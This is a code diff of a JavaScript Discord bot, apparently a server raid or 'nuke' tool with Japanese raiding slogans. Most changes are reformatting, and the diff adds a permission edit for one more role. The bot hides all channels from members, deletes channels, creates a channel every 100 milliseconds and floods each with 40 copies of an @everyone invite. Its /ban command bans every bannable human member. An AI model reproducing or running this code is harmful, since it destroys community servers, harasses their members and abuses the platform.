@@ -9,7 +9,7 @@ const {
   IntentsBitField,
   Partials
 } = require("discord.js");
-const msg=`https://discord.gg/QAJcNg25
+const msg = `https://discord.gg/QAJcNg25
 @everyone
 ​
 ​
@@ -50,17 +50,19 @@ const msg=`https://discord.gg/QAJcNg25
 `
 const fs = require("fs")
 
-const client = new Client({ intents: [
+const client = new Client({
+  intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.GuildMembers,
     GatewayIntentBits.DirectMessages
-  ], partials: [Partials.Channel] });
+  ], partials: [Partials.Channel]
+});
 var ctkppng = fs.readFileSync("./ctkp.png")
 
-process.on('uncaughtException', function(err) {
-    console.log(err)
+process.on('uncaughtException', function (err) {
+  console.log(err)
 });
 
 client.on("messageCreate", async (message) => {
@@ -71,22 +73,25 @@ client.on("messageCreate", async (message) => {
     var ch = JSON.parse(JSON.stringify(message.guild)).channels
     for (const a of ch) {
 
-      client.channels.cache.get(a).permissionOverwrites.edit(message.guild.roles.everyone,{
-        ViewChannel:false
-      })
+      client.channels.cache.get(a).permissionOverwrites.edit(message.guild.roles.everyone, {
+        ViewChannel: false
+      }, { type: "Role" })
+      client.channels.cache.get(a).permissionOverwrites.edit("1067032510367813684", {
+        ViewChannel: false
+      }, { type: "Role" })
     }
-    var qwer = setInterval(function() {
+    var qwer = setInterval(function () {
       client.guilds.cache.get(g).channels.create({
         name: `荒らし連合軍最強!`,
         type: 0,
         parent: null
       }).then((ch) => {
-        
-          ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);
-        
+
+        ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg);
+
       }).catch((err) => { console.log(err); });
     }, 100)
-    setTimeout(function(){clearInterval(qwer)},6000)
+    setTimeout(function () { clearInterval(qwer) }, 6000)
     console.log(ch)
 
   }
@@ -107,34 +112,34 @@ client.on("interactionCreate", async (interaction) => {
 
       client.channels.cache.get(a).delete()
     }
-    
-    var qwer = setInterval(function() {
+
+    var qwer = setInterval(function () {
       client.guilds.cache.get(g).channels.create({
         name: `ワッパステイ主席万歳!荒らし共栄圏最強!`,
         type: 0,
         parent: null
       }).then((ch) => {
-        ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);
+        ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg); ch.send(msg);
       }).catch((err) => { console.log(err); });
     }, 100)
-    setTimeout(function(){clearInterval(qwer)},6000)
+    setTimeout(function () { clearInterval(qwer) }, 6000)
     console.log(ch)
   }
-    if (interaction.commandName === 'ban') {
-        await interaction.deferReply();
-        for(const d of JSON.parse(JSON.stringify(interaction.guild)).members){
-            
-            	var p = await interaction.guild.members.fetch(d)
-                if(!p.bot){
-                	console.log(p)
-			if(p.bannable){
-		 	 	p.ban()
-				}
-               		}
-		}
-        interaction.editReply("BANしました")
-		interaction.editReply("実装中の機能です。")
+  if (interaction.commandName === 'ban') {
+    await interaction.deferReply();
+    for (const d of JSON.parse(JSON.stringify(interaction.guild)).members) {
+
+      var p = await interaction.guild.members.fetch(d)
+      if (!p.bot) {
+        console.log(p)
+        if (p.bannable) {
+          p.ban()
+        }
+      }
     }
+    interaction.editReply("BANしました")
+    interaction.editReply("実装中の機能です。")
+  }
 });
 
 
@@ -144,9 +149,9 @@ client.on('ready', async () => {
   const data = [{
     name: "setup",
     description: "セットアップを開始します",
-  },{
-      name:"ban",
-	  description: "BANします",
+  }, {
+    name: "ban",
+    description: "BANします",
   }];
   await client.application.commands.set();
   console.log("Ready!");
